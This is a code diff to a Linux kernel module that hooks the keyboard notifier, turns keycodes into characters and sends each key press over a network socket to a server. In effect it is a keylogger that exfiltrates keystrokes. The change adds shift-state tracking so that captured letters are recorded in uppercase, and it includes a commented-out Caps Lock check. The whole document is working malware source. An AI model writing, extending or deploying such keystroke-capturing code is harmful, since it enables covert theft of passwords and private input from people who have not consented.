@@ -44,6 +44,27 @@ static const char *keymap[MAX_KEYCODE + 1] = {
 //static int buffer_index = 0;
 static struct socket *sock;
 static struct sockaddr_in s_addr;
+short shift_pressed = 0;
+
+// static short get_capslock_state(void)
+// {
+//     struct input_dev *keyboard_dev;
+//     short caps_state = 0;
+
+//     // Pobierz urządzenie klawiatury
+//     keyboard_dev = input_get_device();
+//     if (!keyboard_dev) {
+//         pr_err("Can't find the device\n");
+//         return -1;
+//     }
+
+//     caps_state = test_bit(LED_CAPSL, keyboard_dev->led);
+
+//     // Free device
+//     input_put_device(keyboard_dev);
+
+//     return caps_state;
+//}
 
 // Function to send data to the server
 static int send_data_to_server(const char *data)
@@ -68,11 +89,22 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
 {
     struct keyboard_notifier_param *kp = param;
 
+    if (kp->value == KEY_LEFTSHIFT || kp->value == KEY_RIGHTSHIFT) {
+        shift_pressed = kp->down;  // Update shift state when the key is pressed or released
+    }
+
     if (kp->down && kp->value >= 0 && kp->value <= MAX_KEYCODE) {
         const char *key_char = keymap[kp->value];
         if (key_char) {
             char message[BUFFER_SIZE];
-            snprintf(message, BUFFER_SIZE, "Key pressed: %s", key_char);
+            char display_char = key_char[0];
+            if (shift_pressed && display_char >= 'a' && display_char <= 'z') {
+                display_char = display_char - 'a' + 'A';  // Convert to uppercase
+                snprintf(message, BUFFER_SIZE, "Key pressed: %c", display_char);
+            }
+            else{
+                snprintf(message, BUFFER_SIZE, "Key pressed: %s", key_char);
+            }
             send_data_to_server(message);
             pr_info("Data sent to server: %s", message);
         }
